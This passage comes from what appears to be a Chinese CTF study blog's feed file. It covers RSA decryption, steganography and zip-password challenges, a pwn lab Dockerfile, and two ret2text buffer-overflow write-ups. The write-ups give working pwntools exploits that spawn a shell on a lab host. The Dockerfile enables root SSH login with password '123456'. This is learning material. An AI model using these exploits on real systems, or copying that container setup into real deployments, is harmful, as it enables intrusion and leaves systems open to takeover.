6500795702216834621109042351193261530650043841056252930930949663358625016881832840728066026150264693076109354874099841380454881716097778307268116910582929</span><br><span class="line">dq = 783472263673553449019532580386470672380574033551303889137911760438881683674556098098256795673512201963002175438762767516968043599582527539160811120550041</span><br><span class="line">c = 24722305403887382073567316467649080662631552905960229399079107995602154418176056335800638887527614164073530437657085079676157350205351945222989351316076486573599576041978339872265925062764318536089007310270278526159678937431903862892400747915525118983959970607934142974736675784325993445942031372107342103852</span><br><span class="line"> </span><br><span class="line">I = gmpy2.invert(q, p) </span><br><span class="line"> # 计算了q模p的模逆元。在数学上，这意味着I是一个整数，使得q * I mod p = 1。注意，这里的I并不是中国剩余定理中常用的h（h是p模q的模逆元），但在这个上下文中，我们只需要I</span><br><span class="line"> </span><br><span class="line">mp = pow(c, dp, p)   #使用模幂运算，计算c的dp次方模p的结果。</span><br><span class="line">mq = pow(c, dq, q)   #使用模幂运算，计算c的dq次方模q的结果。</span><br><span class="line"> </span><br><span class="line">m = (((mp-mq) * I) % p) * q + mq      #CRT的一个变种，用于从mp和mq中恢复明文m</span><br><span class="line"> </span><br><span class="line">print(long_to_bytes(m))    #解密后的整数m转换为字节字符串并输出 </span><br></pre></td></tr></table></figure><p> b’noxCTF{W31c0m3_70_Ch1n470wn}’→flag{W31c0m3_70_Ch1n470wn}</p>]]></content>
      
      
      <categories>
          
          <category> Crypto </category>
          
          <category> 非对称加密（Asymmetric Cryptography） </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>r4</title>
      <link href="/2025/06/e37fae821c0c.html"/>
      <url>/2025/06/e37fae821c0c.html</url>
      
        <content type="html"><![CDATA[]]></content>
      
      
      <categories>
          
          <category> Crypto </category>
          
          <category> 非对称加密（Asymmetric Cryptography） </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>原理</title>
      <link href="/2025/06/1020b887dd37.html"/>
      <url>/2025/06/1020b887dd37.html</url>
      
        <content type="html"><![CDATA[<p><strong>密钥计算方法</strong><br>1.选择两个大素数p和q(典型值为1024位)<br>2.计算<code>n=p×q</code>和<code>z=(p-1)×(q-1)</code><br>&#x2F;&#x2F; n表示欧拉函数<br>3.选择一个与z互质的数，令其为d<br>4.找到一个 e 使满足<code>exd= 1 (mod z)</code><br>5.公开密钥为<code>(e，m)</code>，私有密钥为<code>(d，m)</code><br><strong>密钥举例</strong><br>代码如下（示例）：1.假设需要加密的明文信息为m&#x3D;85，选择：e&#x3D;7，p&#x3D;11，q&#x3D;13，说明使用RSA算法的加密和解密(计算密文并还原)</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">n=p*q=11*13=143</span><br><span class="line">z=（p-1）*（q-1）=10*12=120</span><br><span class="line"></span><br><span class="line">e*d=1(mod z)  </span><br><span class="line">7 * d( mod 120)=1  -------d=103</span><br></pre></td></tr></table></figure><p>1️⃣加密运算<br>公钥:(e,n)&#x3D;(7,143)<br>密文c&#x3D;p^e (mod n)&#x3D;123<br>2️⃣加密运算<br>密钥:(d,n)&#x3D;(103,143)<br>明文：P&#x3D;c^d (mod n)&#x3D;85</p>]]></content>
      
      
      <categories>
          
          <category> Crypto </category>
          
          <category> 非对称加密（Asymmetric Cryptography） </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>感觉身上重重的</title>
      <link href="/2025/06/098257f0671a.html"/>
      <url>/2025/06/098257f0671a.html</url>
      
        <content type="html"><![CDATA[<p><img src="/images/out.jpg"><br><img src="/images/Pastedimage20250604103412.png"><br>TZCFlag{copy_is_useful}<br>&#x3D;&#x3D;图片下面有字隐藏其实，用stegsolve&#x3D;&#x3D;</p>]]></content>
      
      
      <categories>
          
          <category> MISC </category>
          
          <category> 图片 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>伪加密</title>
      <link href="/2025/06/3411655f66f0.html"/>
      <url>/2025/06/3411655f66f0.html</url>
      
        <content type="html"><![CDATA[<p><img src="/images/%7B354DEABD-F725-4BE5-8E53-3E409F7E10FC%7D.png"></p><hr>]]></content>
      
      
      <categories>
          
          <category> MISC </category>
          
          <category> 压缩包 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>掩码</title>
      <link href="/2025/06/bb2621d41570.html"/>
      <url>/2025/06/bb2621d41570.html</url>
      
        <content type="html"><![CDATA[<p>小强找到自己的压箱底学习资料，但是发现有密码，他隐约记得密码是长 <code>AQ***g0**0</code>，中间 <code>*</code> 号只记得是小写字母和数字，你能帮他找回密码吗<br><img src="/images/Pastedimage20250604130116.png"><br><img src="/images/Pastedimage20250604130408.png">TZCFlag{th3_password_1s_s0_so_weak}</p>]]></content>
      
      
      <categories>
          
          <category> MISC </category>
          
          <category> 压缩包 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>暴力</title>
      <link href="/2025/06/bf9cbf41e4a4.html"/>
      <url>/2025/06/bf9cbf41e4a4.html</url>
      
        <content type="html"><![CDATA[<p><img src="/images/Pastedimage20250604125245.png">TZCFlag{the_passw0rd_is_sooo_weak}</p>]]></content>
      
      
      <categories>
          
          <category> MISC </category>
          
          <category> 压缩包 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>明文</title>
      <link href="/2025/06/8a95981b2a01.html"/>
      <url>/2025/06/8a95981b2a01.html</url>
      
        <content type="html"><![CDATA[<p><img src="/images/%7B57FCDD10-AE2B-4DBF-8DE9-1B19984A5445%7D.png"><br>把pdf改成压缩包</p><p><img src="/images/Pastedimage20250604130730.png"><br><img src="/images/%7B9FF4A261-2915-4D42-B8F4-FFA1CA8AB5E5%7D.png"><br>有问题</p>]]></content>
      
      
      <categories>
          
          <category> MISC </category>
          
          <category> 压缩包 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>伪加密</title>
      <link href="/2025/06/4b2a6ff1da24.html"/>
      <url>/2025/06/4b2a6ff1da24.html</url>
      
        <content type="html"><![CDATA[]]></content>
      
      
      <categories>
          
          <category> MISC </category>
          
          <category> 压缩包 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>steghide</title>
      <link href="/2025/06/c540cc75b717.html"/>
      <url>/2025/06/c540cc75b717.html</url>
      
        <content type="html"><![CDATA[<p><img src="/images/Pastedimage20250604133850.png"><br>错的</p>]]></content>
      
      
      <categories>
          
          <category> MISC </category>
          
          <category> 综合 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>Banmabanma</title>
      <link href="/2025/06/4c2e0afe7e89.html"/>
      <url>/2025/06/4c2e0afe7e89.html</url>
      
        <content type="html"><![CDATA[]]></content>
      
      
      <categories>
          
          <category> MISC </category>
          
          <category> 码类 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>hear with you eyes</title>
      <link href="/2025/06/f342c5c4709f.html"/>
      <url>/2025/06/f342c5c4709f.html</url>
      
        <content type="html"><![CDATA[<p>打开频谱图<br><img src="/images/%7B2D31FA56-C817-4AC6-A587-C9008BA90B74%7D.png"></p>]]></content>
      
      
      <categories>
          
          <category> MISC </category>
          
          <category> 音频 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>steghide</title>
      <link href="/2025/06/fdd3a6b2e8b3.html"/>
      <url>/2025/06/fdd3a6b2e8b3.html</url>
      
        <content type="html"><![CDATA[<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">steghide extract -sf your_file.wav #从 WAV 文件中提取隐藏数据</span><br></pre></td></tr></table></figure><p><img src="/images/%7BBEE0A87B-FE33-46DE-B36F-EB728163008C%7D.png"><br>&#x3D;&#x3D;<strong>要转换的文件放在它的文件夹下</strong>&#x3D;&#x3D;<br><img src="/images/%7B11E69F33-84F4-4962-A257-E294ED63D946%7D.png"><br>TZCFlag{steghide_is_so_interesting}</p>]]></content>
      
      
      <categories>
          
          <category> MISC </category>
          
          <category> 音频 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>很普通的Disco</title>
      <link href="/2025/06/ff1c1e43f89c.html"/>
      <url>/2025/06/ff1c1e43f89c.html</url>
      
        <content type="html"><![CDATA[<p>放大<img src="/images/%7B051C5CE7-A087-4021-8A67-CA44B66376DE%7D.png"><br>110011011011001100001110011111110111010111011000010101110101010110011011101011101110110111011110011111101<br>&#x3D;&#x3D;<strong>ASCII是7位</strong>&#x3D;&#x3D;</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">string = &#x27;110011011011001100001110011111110111010111011000010101110101010110011011101011101110110111011110011111101&#x27;</span><br><span class="line"> </span><br><span class="line">flag = &#x27;&#x27;</span><br><span class="line">for i in range(0, len(string), 7):</span><br><span class="line">    bin_str = string[i: i + 7]</span><br><span class="line">    flag += chr(int(bin_str, 2))</span><br><span class="line"> </span><br><span class="line">print(flag)</span><br></pre></td></tr></table></figure><p>flag{W0W*funny}</p>]]></content>
      
      
      <categories>
          
          <category> MISC </category>
          
          <category> 音频 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>Dockerfile</title>
      <link href="/2025/06/89158a38ae9d.html"/>
      <url>/2025/06/89158a38ae9d.html</url>
      
        <content type="html"><![CDATA[<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br></pre></td><td class="code"><pre><span class="line">FROM ubuntu:24.04</span><br><span class="line"></span><br><span class="line">ARG DEBIAN_FRONTEND=noninteractive</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">#  32 </span></span><br><span class="line">RUN dpkg --add-architecture i386 &amp;&amp; apt-get -y update</span><br><span class="line"></span><br><span class="line"><span class="comment"># </span></span><br><span class="line">RUN apt-get install -y \</span><br><span class="line">    apt-transport-https \</span><br><span class="line">    vim \</span><br><span class="line">    nano \</span><br><span class="line">    git \</span><br><span class="line">    curl \</span><br><span class="line">    wget \</span><br><span class="line">    <span class="built_in">sudo</span> \</span><br><span class="line">    netcat-openbsd \</span><br><span class="line">    openssh-server \</span><br><span class="line">    unzip \</span><br><span class="line">    bison \</span><br><span class="line">    flex</span><br><span class="line"></span><br><span class="line"><span class="comment"># </span></span><br><span class="line">RUN apt-get install -y \</span><br><span class="line">    python3 \</span><br><span class="line">    python3-pip \</span><br><span class="line">    python3-venv \</span><br><span class="line">    python3-dev \</span><br><span class="line">    python3-setuptools</span><br><span class="line"></span><br><span class="line"><span class="comment"># </span></span><br><span class="line">RUN apt-get install -y \</span><br><span class="line">    build-essential \</span><br><span class="line">    libglib2.0-dev \</span><br><span class="line">    libfdt-dev \</span><br><span class="line">    libpixman-1-dev \</span><br><span class="line">    zlib1g-dev \</span><br><span class="line">    gcc-multilib \</span><br><span class="line">    gdb \</span><br><span class="line">    gdb-multiarch \</span><br><span class="line">    clang \</span><br><span class="line">    lldb \</span><br><span class="line">    make \</span><br><span class="line">    cmake</span><br><span class="line"></span><br><span class="line"><span class="comment"># </span></span><br><span class="line">RUN apt-get install -y \</span><br><span class="line">    qemu-system-x86 \</span><br><span class="line">    qemu-user \</span><br><span class="line">    qemu-user-binfmt \</span><br><span class="line">    tmux \</span><br><span class="line">    konsole</span><br><span class="line"></span><br><span class="line"><span class="comment"># 32</span></span><br><span class="line">RUN apt-get install -y \</span><br><span class="line">    lib32z1 \</span><br><span class="line">    libc6-dbg \</span><br><span class="line">    libc6-dbg:i386 \</span><br><span class="line">    libgcc-s1:i386</span><br><span class="line"></span><br><span class="line"><span class="comment"># enable ssh login</span></span><br><span class="line">RUN <span class="built_in">rm</span> -f /etc/service/sshd/down</span><br><span class="line">RUN sed -ri <span class="string">&#x27;s/^#?PermitRootLogin\s+.*/PermitRootLogin yes/&#x27;</span> /etc/ssh/sshd_config &amp;&amp;\</span><br><span class="line">    sed -ri <span class="string">&#x27;s/#UseDNS\ no/UseDNS\ no/g&#x27;</span> /etc/ssh/sshd_config &amp;&amp; \</span><br><span class="line">    sed -ri <span class="string">&quot;s/StrictModes yes/StrictModes no/g&quot;</span> /etc/ssh/sshd_config &amp;&amp; \</span><br><span class="line">    sed -ri <span class="string">&quot;s/UsePAM yes/UsePAM no/g&quot;</span> /etc/ssh/sshd_config</span><br><span class="line"></span><br><span class="line"><span class="comment"># enable login with password</span></span><br><span class="line">RUN <span class="built_in">echo</span> <span class="string">&#x27;PasswordAuthentication yes&#x27;</span> &gt;&gt; /etc/ssh/sshd_config</span><br><span class="line"></span><br><span class="line"><span class="comment"># defaultly we have a user `ubuntu` in the image</span></span><br><span class="line">RUN <span class="built_in">echo</span> <span class="string">&quot;ubuntu:123456&quot;</span> | chpasswd &amp;&amp; \</span><br><span class="line">    <span class="built_in">echo</span> <span class="string">&quot;root:123456&quot;</span> | chpasswd</span><br><span class="line"></span><br><span class="line"><span class="comment"># add sudo</span></span><br><span class="line">RUN usermod -aG <span class="built_in">sudo</span> ubuntu</span><br><span class="line"></span><br><span class="line"><span class="comment"># enable ssh key login</span></span><br><span class="line"><span class="comment">#RUN mkdir /home/ubuntu/.ssh &amp;&amp; \</span></span><br><span class="line"><span class="comment">#    echo &quot;Your ssh key&quot; &gt; /home/ubuntu/.ssh/authorized_keys</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># keep container running</span></span><br><span class="line">RUN <span class="built_in">echo</span> <span class="string">&quot;#!/bin/sh\nservice ssh restart\nsleep infinity&quot;</span> &gt; /root/start.sh</span><br><span class="line">RUN <span class="built_in">chmod</span> +x /root/start.sh</span><br><span class="line"></span><br><span class="line"><span class="comment"># create venv for pip</span></span><br><span class="line">RUN python3 -m venv /pip_venv &amp;&amp; \</span><br><span class="line">    <span class="built_in">chown</span> -R ubuntu:ubuntu /pip_venv &amp;&amp; \</span><br><span class="line">    <span class="built_in">echo</span> <span class="string">&quot;\n\n# pip venv\nsource /pip_venv/bin/activate&quot;</span> &gt;&gt; /home/ubuntu/.bashrc</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># pwn-related tools</span></span><br><span class="line">RUN /pip_venv/bin/pip config <span class="built_in">set</span> global.index-url https://pypi.org/simple &amp;&amp; \</span><br><span class="line">    /pip_venv/bin/pip config <span class="built_in">set</span> global.trusted-host pypi.org &amp;&amp; \</span><br><span class="line">    /pip_venv/bin/pip install --default-timeout=100 --retries=10 -U pip &amp;&amp; \</span><br><span class="line">    /pip_venv/bin/pip install --default-timeout=100 --retries=10 --no-cache-dir \</span><br><span class="line">    pwntools \</span><br><span class="line">    ropgadget \</span><br><span class="line">    z3-solver \</span><br><span class="line">    smmap2 \</span><br><span class="line">    apscheduler \</span><br><span class="line">    ropper \</span><br><span class="line">    unicorn \</span><br><span class="line">    keystone-engine \</span><br><span class="line">    capstone \</span><br><span class="line">    angr \</span><br><span class="line">    pebble \</span><br><span class="line">    r2pipe \</span><br><span class="line">    LibcSearcher \</span><br><span class="line">    poetry</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># pwndbg</span></span><br><span class="line">RUN git <span class="built_in">clone</span> https://github.com/pwndbg/pwndbg &amp;&amp; \</span><br><span class="line">    <span class="built_in">cd</span> pwndbg &amp;&amp; <span class="built_in">chmod</span> +x setup.sh &amp;&amp; ./setup.sh</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">CMD [<span class="string">&quot;/root/start.sh&quot;</span>]</span><br><span class="line"></span><br><span class="line">EXPOSE 22</span><br></pre></td></tr></table></figure><p>在一个空白文件夹中创建一个名为 <code>Dockerfile</code> 的文件，并写入上述内容，随后运行如下指令：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">docker build -t pwnenv_ubuntu24 .</span><br><span class="line">docker run -d \ -p 25000:22 \ --name=pwn24 \ --cap-add=SYS_PTRACE \ -v ~/Desktop/CTF:/CTF \ pwnenv_ubuntu24</span><br><span class="line">docker exec -w /CTF -e TERM=xterm-256color -u ubuntu -it pwn24 bash   #进入容器</span><br></pre></td></tr></table></figure><ul><li><code>-d</code>： 使容器在后台运行</li><li><code>-p 25000:22</code>： 容器的 <code>22</code> 端口映射到本地的 <code>25000</code> 端口</li><li><code>--name=pwn24</code>： 容器名为 <code>pwn24</code></li><li><code>--cap-add=SYS_PTRACE</code>：添加 <code>SYS_PTRACE</code> 权限，允许调试和追踪进程</li><li><code>-v ~/Desktop/CTF:/CTF</code> ： 将本地的 <code>~/Desktop/CTF</code> 目录映射到容器中的 <code>/CTF</code> 目录，这样我们便能在容器内访问到本地文件，而无需将文件重复拷贝进容器中</li><li><code>pwnenv_ubuntu24</code>：创建容器所使用的镜像</li></ul><p><strong>启动问题：打开还是gdb 而不是pwngdb</strong><br><img src="/images/Pastedimage20250612160927.png"><br><img src="/images/Pastedimage20250612161114.png"><br><img src="/images/Pastedimage20250612161139.png"><br><img src="/images/%7BD339EED4-6AF8-4063-858A-B1FA023C4114%7D1.png"></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">find / -name <span class="string">&quot;pwndbg&quot;</span> 2&gt;/dev/null <span class="comment"># 查找 pwndbg 目录</span></span><br><span class="line"><span class="built_in">cd</span> /pwndbg</span><br><span class="line"><span class="built_in">ls</span></span><br><span class="line"><span class="built_in">sudo</span> <span class="built_in">chown</span> -R ubuntu:ubuntu /pwndbg <span class="comment">#赋予目录权限</span></span><br><span class="line">./setup.sh</span><br></pre></td></tr></table></figure><p>以后启动：<br>&#x3D;&#x3D;sudo docker start pwn24&#x3D;&#x3D; #启动容器<br>&#x3D;&#x3D;sudo docker exec -w &#x2F;CTF -e TERM&#x3D;xterm-256color -u ubuntu -it pwn24 bash&#x3D;&#x3D;  #进入容器</p><p>退出虚拟环境：deactivate           exit</p>]]></content>
      
      
      <categories>
          
          <category> PWN </category>
          
          <category> Docker搭建 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>32位</title>
      <link href="/2025/06/4857d55b1f10.html"/>
      <url>/2025/06/4857d55b1f10.html</url>
      
        <content type="html"><![CDATA[<p><img src="/images/%7B0E02FF5F-B470-4DFF-ACBA-4AB58A61BF8E%7D.png"><br><img src="/images/%7B2574EBBA-F48A-4D4A-82BA-B370AF737470%7D.png"><br><img src="/images/Pastedimage20250605202610.png"><br><img src="/images/Pastedimage20250605203003.png"><br><img src="/images/Pastedimage20250605205511.png"><br>这里 system 函数的地址：0x80483A0</p><p>这里将系统函数与参数分开了，我们需要手动构造，这是ROP？</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">payload = b&#x27;a&#x27;*(0x12+4) + p32(system) + p32(0) + p32(bin_sh)</span><br><span class="line">b&#x27;a&#x27; * (0x12 + 4)：这部分是填充，填充的目的是使得输入的长度超过了原本的缓冲区大小，触发缓冲区溢出。</span><br><span class="line">p32(system)：这部分是 system 函数的地址，在利用缓冲区溢出漏洞时，重要的一步是覆盖返回地址，使得程序返回时跳转到 system 函数。</span><br><span class="line">p32(0)：这部分是 system 函数的第二个参数，在大多数情况下，system 函数的第二个参数应该是一个指向空值的指针，表示没有额外的参数，这里使用了0，表示一个空指针。</span><br><span class="line">p32(bin_sh)：这部分是 /bin/sh 字符串的地址，作为 system 函数的第一个参数，/bin/sh 是一个用于启动 shell 的路径，在利用缓冲区溢出漏洞时，我们可以使用这个参数来告诉 system 函数要执行的命令。</span><br></pre></td></tr></table></figure><p>首先在溢出后填入 system 函数的地址，这个地址将覆盖程序返回地址，以便控制程序流程。<br>此外我们需要考虑函数调用栈的结构：system函数的第一个参数通常是一个指向要执行的命令的字符串，如 &#x2F;bin&#x2F;sh，需要将这个字符串的地址作为参数传递给 system 函数，system 函数的第二个参数通常是一个指向空值的指针，表示没有额外的参数。在 payload 中，可以使用任意值，比如  0 ，使用 p32() 函数将地址转换为4字节的字符串，也可以用其他任意 4 字节字符，如 ‘aaaa’，最后再加上 bin&#x2F;sh 的地址，我们就能够利用缓冲区溢出漏洞成功调用 system(“&#x2F;bin&#x2F;sh”)，从而获取到所需的 shell。<br><img src="/images/%7B24A745DD-622B-4D5D-89E0-A74989D98664%7D.png"><br>&#x2F;bin&#x2F;sh 字符串的地址： 0x8048750</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context.log_level = <span class="string">&#x27;debug&#x27;</span></span><br><span class="line">p = remote(<span class="string">&#x27;10.190.131.17&#x27;</span>, <span class="number">28118</span>)</span><br><span class="line">payload = <span class="string">b&#x27;a&#x27;</span>*(<span class="number">0x12</span>+<span class="number">4</span>) + p32(<span class="number">0x80483A0</span>) + p32(<span class="number">0</span>) + p32(<span class="number">0x8048750</span>)</span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><p><img src="/images/%7BE620E748-CEBD-4166-BD5C-889B55FC7B0C%7D.png"></p>]]></content>
      
      
      <categories>
          
          <category> PWN </category>
          
          <category> ret2text 栈溢出 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>64位</title>
      <link href="/2025/06/8764702209e4.html"/>
      <url>/2025/06/8764702209e4.html</url>
      
        <content type="html"><![CDATA[<p><img src="/images/%7BEDC60431-C7F0-4706-B7EE-C0C20022E216%7D.png"><br><img src="/images/%7B89BB9CEE-D6C5-4168-8559-A837556C9144%7D.png"><br><img src="/images/Pastedimage20250605190959.png"><br>buf 到栈底（ebp）的距离是：0xA，64 位程序加上 8 字节的栈底（rbp）<br><img src="/images/Pastedimage20250605191047.png"><br>backdoor函数地址：0x400657<br>对于 32 位程序来说，现在就能打通了<br>但是这里是 64 位程序，需要处理堆栈平衡<br>#堆栈平衡：当我们在堆栈中进行堆栈的操作的时候，一定要保证在ret这条指令之前，esp指向的是我们压入栈中的地址，函数执行到ret执行之前，堆栈栈顶的地址一定要是call指令的下一个地址。<br>因此我们还需要找一个地址： lev 的地址或者该函数结束的地址（即 retn 的地址）<br>直接看 backdoor 函数的汇编代码：<br><img src="/images/Pastedimage20250605192121.png"><br>lev 的地址：0x40065B<br>retn 的地址：0x40066D<br>&#x3D;&#x3D;<strong>特别注意：构造 payload 时将该地址放在该函数开始地址之前</strong>&#x3D;&#x3D;</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context.log_level = <span class="string">&#x27;debug&#x27;</span></span><br><span class="line">p = remote(<span class="string">&#x27;10.190.131.17&#x27;</span>, <span class="number">55024</span>)</span><br><span class="line">payload = <span class="string">b&#x27;a&#x27;</span>*(<span class="number">0xA</span>+<span class="number">8</span>) + p64(<span class="number">0x40065B</span>) + p64(<span class="number">0x400657</span>)</span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.interactive()</span><br><span class="line"></span><br><span class="line"><span class="comment">#payload = b&#x27;a&#x27;*(0xA+8) + p64(0x40066D) + p64(0x400657) 可</span></span><br><span class="line"><span class="comment">#payload = b&#x27;a&#x27;*(0xA+8) + p64(0x40065B) 也可以啊不是很懂</span></span><br></pre></td></tr></table></figure><p><img src="/images/%7BBDC96406-6B8C-4852-90CC-38D5162440C3%7D.png"></p><ol><li><code>p64(0x40065B)</code> → 覆盖返回地址为<code>0x40065B</code></li><li><code>p64(0x400657)</code> → 在栈上放置后门函数地址</li></ol><h3 id="执行流程"><a href="#执行流程" class="headerlink" title="执行流程"></a>执行流程</h3><p>当函数返回时：</p><ol><li>跳转到<code>0x40065B</code>（跳过函数开头的<code>push rbp; mov rbp, rsp</code>）</li><li>执行<code>lea rdi, command</code> → 设置好<code>system</code>的参数</li><li>执行<code>call _system</code> → 调用<code>system(&quot;/bin/sh&quot;)</code></li><li>执行<code>pop rbp</code> → 弹出栈顶值到RBP（此时栈顶是<code>0x400657</code>）</li><li>执行<code>retn</code> → 弹出栈顶值<code>0x400657</code>到RIP，跳转到后门函数开头</li></ol><h3 id="为什么要这样跳转两次？"><a href="#为什么要这样跳转两次？" class="headerlink" title="为什么要这样跳转两次？"></a>为什么要这样跳转两次？</h3><ol><li><strong>避免栈对齐问题</strong>：64位系统要求调用函数时栈指针16字节对齐<ul><li>直接跳转到<code>0x40065B</code>时，栈指针可能未对齐</li><li>第二次跳转到函数开头（<code>0x400657</code>）会执行<code>push rbp</code>，使栈对齐</li></ul></li><li><strong>确保参数正确设置</strong>：<ul><li>第一次跳转确保<code>rdi</code>正确设置为<code>&quot;/bin/sh&quot;</code></li><li>第二次跳转执行完整的<code>system</code>调用</li></ul></li></ol>]]></content>
      
      
      <categories>
          
          <category> PWN </category>
          
          <category> ret2text 栈溢出 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>我的眼睛能看到比较低的东西</title>
      <link href="/2025/06/b7489399e5c7.html"/>
      <url>/2025/06/b7489399e5c7.html</url>
      
        <content type="html"><![CDATA[<p><img src="/images/flag11.png"><br><img src="/images/%7BB7FFEEE2-E071-41DC-A3E3-4BDA0719A462%7D.png"><br><img src="/images/Pastedimage20250604104025.png"><br><img src="/images/Pastedimage20250604104046.png"><br><img src="/images/Pastedimage20250604105300.png"><br><img src="/images/%7B3E1FFA08-BA9D-4AA5-8A9A-6D469456C255%7D.png"><br><img src="/images/%7BCE52806F-ECC7-47DF-8A20-7224D63472F8%7D.png"><br>cumtctf{1sb_i4_s0_Ea4y}</p>]]></content>
      
      
      <categories>
          
          <category> MISC </category>
          
          <category> 图片 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>ret2text</title>
      <link href="/2025/06/7a81113665b5.html"/>
      <url>/2025/06/7a81113665b5.html</url>
      
